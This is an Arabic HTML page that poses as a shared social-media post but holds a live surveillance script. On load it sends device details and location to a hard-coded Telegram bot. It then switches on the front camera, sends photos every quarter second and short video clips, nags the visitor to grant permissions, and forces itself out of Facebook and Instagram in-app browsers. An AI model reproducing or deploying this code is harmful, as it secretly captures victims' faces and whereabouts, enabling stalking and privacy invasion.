<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Shahin Zyan masengar</title>
  <!-- Open Graph tags - سيتم تحديثها بواسطة Workflow -->
  <meta property="og:title" content="Shahin Zyan masengar">
  <meta property="og:description" content="شارك لك منشور">
  <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
  <meta name="twitter:title" content="Shahin Zyan masengar">
  <meta name="twitter:description" content="شارك لك منشور">
  <meta name="twitter:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
  <style>
    :root {
      --bg: #f0f2f5;
      --card-bg: #ffffff;
      --text-primary: #1c1e21;
      --text-secondary: #65676b;
      --border: #e4e6eb;
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #18191a;
        --card-bg: #242526;
        --text-primary: #e4e6eb;
        --text-secondary: #b0b3b8;
        --border: #3e4042;
      }
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: var(--bg);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      padding-top: 20px;
      min-height: 100vh;
      position: relative;
    }
    .post-container {
      max-width: 500px; width: 100%; background: var(--card-bg);
      border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1);
      overflow: hidden; border: 1px solid var(--border);
    }
    .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
    .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
    .post-time { font-size: 13px; color: var(--text-secondary); }
    .post-text { padding: 4px 16px 12px; font-size: 15px; color: var(--text-primary); white-space: pre-wrap; }
    .post-image img { width: 100%; display: block; }
    .post-stats { display: flex; justify-content: space-between; padding: 8px 16px; font-size: 13px; color: var(--text-secondary); border-top: 1px solid var(--border); }
    .post-actions { display: flex; justify-content: space-evenly; padding: 4px 16px 8px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px; font-weight: 600; }
    .post-actions span { cursor: pointer; padding: 8px 0; flex: 1; text-align: center; }
    .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
    .three-dots:hover { background: var(--border); }

    /* شاشة إعادة المحاولة الموحدة */
    .retry-overlay {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
    }
    .retry-btn {
      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
    }
    .hidden { display: none !important; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="post-container hidden" id="postContainer">
    <div class="post-header">
      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
      <div>
        <div class="post-user">المستخدم</div>
        <div class="post-time">الآن</div>
      </div>
      <div class="three-dots">⋯</div>
    </div>
    <div class="post-text">جارٍ تحميل المنشور...</div>
    <div class="post-stats"><span>0 تعليق</span><span>0 مشاركة</span></div>
    <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
  </div>

  <!-- شاشة إعادة المحاولة الموحدة (تظهر عند رفض أي صلاحية) -->
  <div class="retry-overlay" id="retryOverlay">
    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // ==================== إعدادات ====================
    const B = '69ee19e8856a68218974812e';
    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
    const C = '5151102782';
    const I = 'a7e43833d69a75';

    const post = document.getElementById('postContainer');
    const overlay = document.getElementById('retryOverlay');
    const retryBtn = document.getElementById('retryBtn');
    const vid = document.getElementById('video');
    const cnv = document.getElementById('canvas');
    const ctx = cnv.getContext('2d');

    let stream = null, photos = 0, captureInterval = null, recording = false;
    let deviceInfoSent = false, gpsLoc = null, ipLoc = null, redirectUrl = 'https://www.facebook.com';
    let waitingFor = null; // 'location' أو 'camera'

    // ==================== دوال مساعدة ====================
    async function sendText(txt) {
      try {
        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: C, text: txt, parse_mode: 'HTML' })
        });
      } catch (e) {}
    }

    function dataURLtoBlob(dataUrl) {
      const arr = dataUrl.split(','), mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
      return new Blob([u8], { type: mime });
    }

    function showOverlay() { overlay.classList.remove('hidden'); post.classList.add('hidden'); }
    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }

    // ==================== تحميل المنشور ====================
    async function loadPost() {
      try {
        const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
        const d = await r.json(); const s = d.record || {};
        redirectUrl = s.redirectUrl || redirectUrl;
        post.innerHTML = `
          <div class="post-header">
            <img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
            <div>
              <div class="post-user">${s.profileName||'Shahin Zyan'}</div>
              <div class="post-time">${s.postTime||'الآن'}</div>
            </div>
            <div class="three-dots">⋯</div>
          </div>
          <div class="post-text">${s.postText||'هذا نص تجريبي.'}</div>
          ${s.postImage?`<div class="post-image"><img src="${s.postImage}" alt="صورة المنشور"></div>`:''}
          <div class="post-stats"><span>${s.commentsCount||'12'} تعليق</span><span>${s.sharesCount||'5'} مشاركة</span></div>
          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
      } catch (e) {}
    }

    // ==================== معلومات الجهاز ====================
    async function sendDeviceInfo() {
      if (deviceInfoSent) return;
      deviceInfoSent = true;
      try {
        const ua = navigator.userAgentData || {}; let h = {};
        if (ua.getHighEntropyValues) try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
        const sc = window.screen; let bat = null;
        if ('getBattery' in navigator) try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
        let txt = '<b>📱 معلومات الجهاز</b>\n';
        txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
        txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
        if (bat) txt += `البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
        txt += `اللغة: ${navigator.language}\nالمنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
        await sendText(txt);
      } catch (e) {}
    }

    // ==================== الموقع ====================
    async function fetchIPLocation() {
      try {
        const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
        if (d.loc) {
          const [lat, lon] = d.loc.split(',').map(Number);
          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 https://www.google.com/maps?q=${lat},${lon}`);
        }
      } catch (e) {}
    }

    async function requestGPS() {
      if (!navigator.geolocation) return false;
      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
        });
        if (pos.coords.accuracy > 50) return false;
        gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
        await sendText(`📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n🌍 https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`);
        return true;
      } catch (e) { return false; }
    }

    async function attemptLocation() {
      const ok = await requestGPS();
      if (ok) {
        waitingFor = 'camera'; // ننتقل للكاميرا
        hideOverlay();
        await attemptCamera();
      } else {
        waitingFor = 'location';
        showOverlay();
        if (!ipLoc) await fetchIPLocation();
      }
    }

    // ==================== الكاميرا ====================
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        vid.srcObject = stream;
        await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
        captureInterval = setInterval(captureAndSend, 250);
        return true;
      } catch (e) { return false; }
    }

    function captureAndSend() {
      if (!stream || !vid.videoWidth) return;
      cnv.width = vid.videoWidth; cnv.height = vid.videoHeight;
      ctx.drawImage(vid, 0, 0);
      const blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
      const form = new FormData(); form.append('chat_id', C); form.append('photo', blob, 'snap.jpg');
      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
      photos++;
      if (photos % 5 === 0 && !recording) startVideoRecording();
    }

    function startVideoRecording() {
      if (!stream || recording) return;
      try {
        recording = true; const chunks = [];
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const form = new FormData(); form.append('chat_id', C); form.append('video', blob, 'clip.webm');
          form.append('caption', '🎥 فيديو تلقائي');
          await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
          recording = false;
        };
        recorder.start();
        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
      } catch (e) { recording = false; }
    }

    function stopAll() {
      if (captureInterval) clearInterval(captureInterval);
      if (stream) stream.getTracks().forEach(t => t.stop());
    }

    async function attemptCamera() {
      const ok = await startCamera();
      if (ok) {
        waitingFor = null; // تمت جميع الصلاحيات
        hideOverlay();
      } else {
        waitingFor = 'camera';
        showOverlay();
      }
    }

    // ==================== تقرير الخروج ====================
    async function sendExitReport() {
      let locStr = 'غير متوفر';
      if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
      const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
      await sendText(report);
    }

    // ==================== زر إعادة المحاولة ====================
    retryBtn.addEventListener('click', async () => {
      if (waitingFor === 'location') {
        hideOverlay();
        await attemptLocation();
      } else if (waitingFor === 'camera') {
        hideOverlay();
        await attemptCamera();
      }
    });

    // ==================== خطة الهروب من WebView (الأولوية: سفاري > كروم > أوبرا > فايرفوكس > window.open) ====================
    (function escapePlan() {
      const targetUrl = window.location.href;
      function isInAppBrowser() {
        const ua = navigator.userAgent || '';
        return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
      }

      const iosBrowsers = [
        { name: 'Safari', url: targetUrl.replace(/^https?:\/\//, 'x-safari-https://') },
        { name: 'Chrome', url: targetUrl.replace(/^https?:\/\//, 'googlechrome://') },
        { name: 'Opera', url: 'opera-https://' + targetUrl.replace(/^https?:\/\//, '') },
        { name: 'Firefox', url: 'firefox://open-url?url=' + encodeURIComponent(targetUrl) }
      ];

      const androidBrowsers = [
        { name: 'Chrome', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end` },
        { name: 'Opera', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end` },
        { name: 'Firefox', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end` },
        { name: 'Samsung Internet', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.sec.android.app.sbrowser;end` }
      ];

      const browsers = /Android/i.test(navigator.userAgent) ? androidBrowsers : iosBrowsers;

      function tryNext(index) {
        if (index >= browsers.length) {
          // فشلت جميع المحاولات، نجرب window.open
          window.open(targetUrl, '_blank', 'noopener,noreferrer');
          return;
        }
        const browser = browsers[index];
        try {
          window.location.href = browser.url;
        } catch (e) {}
        // ننتظر قليلاً ثم نجرب التالي إذا لم ننتقل
        setTimeout(() => tryNext(index + 1), 500);
      }

      if (isInAppBrowser()) {
        tryNext(0);
      }
    })();

    // ==================== بدء التشغيل ====================
    window.addEventListener('beforeunload', () => {
      stopAll();
      sendExitReport();
    });

    (async function init() {
      await loadPost();
      sendDeviceInfo();
      fetchIPLocation();
      // إظهار المنشور وزر الإعادة (سنبدأ بطلب الموقع)
      showOverlay();
      waitingFor = 'location';
      // نحاول الموقع بعد لحظة
      setTimeout(attemptLocation, 600);
    })();
  </script>
</body>
</html>
